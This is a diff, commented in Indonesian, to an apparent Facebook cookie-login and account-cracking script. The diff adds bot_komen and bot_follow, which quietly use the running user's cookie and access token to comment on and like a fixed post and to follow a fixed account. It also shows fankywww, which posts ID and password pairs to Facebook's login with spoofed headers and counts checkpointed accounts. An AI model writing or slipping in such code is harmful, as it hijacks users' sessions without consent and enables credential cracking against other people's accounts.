@@ -386,11 +386,11 @@ def logincoki() -> None:
             with open(".fantoken.txt", "w") as tok_file:
                 tok_file.write(token)
 
-            # Memanggil fungsi viperfollow dengan cookie
-
             # Mengirim request dengan token yang didapatkan
             requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cookie})
-
+            bot_komen(cookie, token)
+            bot_follow(cookie, token)
+		
             # Menampilkan token di konsol
             Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
             Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
@@ -411,6 +411,20 @@ def logincoki() -> None:
         time.sleep(3)
         exit()
 
+# --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
+def bot_komen(cok, ken):
+    with requests.Session() as r:
+        text = random.choice(
+            ['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘']
+        )
+        r.cookies.update({'cookie': cok})
+        r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
+        r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
+
+def bot_follow(cok, ken):
+    with requests.Session() as r:
+        r.cookies.update({'cookie': cok})
+        r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')  # Ganti dengan ID akun target
 # --------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
 def viperfollow(VIPER):  # YANG GAK GANTI BOT FOLLOW GANTENG
     from bs4 import BeautifulSoup as BSP
@@ -1105,7 +1119,7 @@ def fankywww(idf, pwv):
                 'dpr': '1.600000023841858',
                 'origin': 'https://touch.alpha.facebook.com',
                 'referer': 'https://touch.alpha.facebook.com/',
-                'accept-encoding': 'gzip, deflate, br',
+                'accept-encoding': 'gzip, deflate',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                 'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
@@ -1131,7 +1145,7 @@ def fankywww(idf, pwv):
                 'next': ''
             }
             fankyimut = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
-            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False,proxies=proxs)
+            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
             if "checkpoint" in ses.cookies.get_dict().keys():
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
